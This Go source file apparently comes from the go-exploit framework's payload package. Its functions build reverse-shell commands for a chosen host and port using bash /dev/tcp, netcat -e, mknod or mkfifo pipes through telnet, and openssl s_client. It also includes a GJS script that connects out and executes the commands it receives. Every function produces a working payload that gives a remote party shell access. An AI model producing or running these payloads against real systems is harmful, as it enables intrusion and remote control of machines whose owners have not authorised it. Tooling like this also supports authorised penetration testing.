package payload

import (
	"fmt"

	"github.com/vulncheck-oss/go-exploit/random"
)

func ReverseShellBash(lhost string, lport int) string {
	return fmt.Sprintf("bash -c 'bash &> /dev/tcp/%s/%d <&1'", lhost, lport)
}

func ReverseShellNetcatGaping(lhost string, lport int) string {
	// busybox nc expects the command to end with the -e option (when in use)
	return fmt.Sprintf("nc %s %d -e /bin/sh", lhost, lport)
}

func ReverseShellMknodTelnet(lhost string, lport int, colon bool) string {
	node := random.RandLetters(3)

	if colon {
		return fmt.Sprintf(`cd /tmp; mknod %s p; sh -i < %s 2>&1 | telnet %s:%d > %s; rm %s;`, node, node, lhost, lport, node, node)
	}

	return fmt.Sprintf(`cd /tmp; mknod %s p; sh -i < %s 2>&1 | telnet %s %d > %s; rm %s;`, node, node, lhost, lport, node, node)
}

func ReverseShellMkfifoTelnet(lhost string, lport int, colon bool) string {
	fifo := random.RandLetters(3)

	if colon {
		return fmt.Sprintf(`cd /tmp; mkfifo %s; telnet %s:%d 0<%s | sh 1>%s; rm %s;`, fifo, lhost, lport, fifo, fifo, fifo)
	}

	return fmt.Sprintf(`cd /tmp; mkfifo %s; telnet %s %d 0<%s | sh 1>%s; rm %s;`, fifo, lhost, lport, fifo, fifo, fifo)
}

func ReverseShellMknodOpenSSL(lhost string, lport int) string {
	node := random.RandLetters(3)

	return fmt.Sprintf(`cd /tmp; mknod %s p; sh -i < %s 2>&1 | openssl s_client -quiet -connect %s:%d > %s; rm %s;`, node, node,
		lhost, lport, node, node)
}

// Generates a script that can be used to create a reverse shell via
// gjs (Gnome JS - present on Ubuntu, Debian by default).
func ReverseShellGJSScript(lhost string, lport int) string {
	return fmt.Sprintf(`const Gio = imports.gi.Gio;
	const GLib = imports.gi.GLib;

	try {
		let connection = (new Gio.SocketClient()).connect_to_host("%s:%d", null, null);
		let output = connection.get_output_stream();
		let input = new Gio.DataInputStream({ base_stream: connection.get_input_stream() });

		while (true) {
			let [cmd, size] = input.read_line(null);
			let [res, out, err, status] = GLib.spawn_command_line_sync(imports.byteArray.toString(cmd));
			output.write_bytes(new GLib.Bytes(imports.byteArray.toString(out)), null);
		}
	} catch (e) {
	}`, lhost, lport)
}
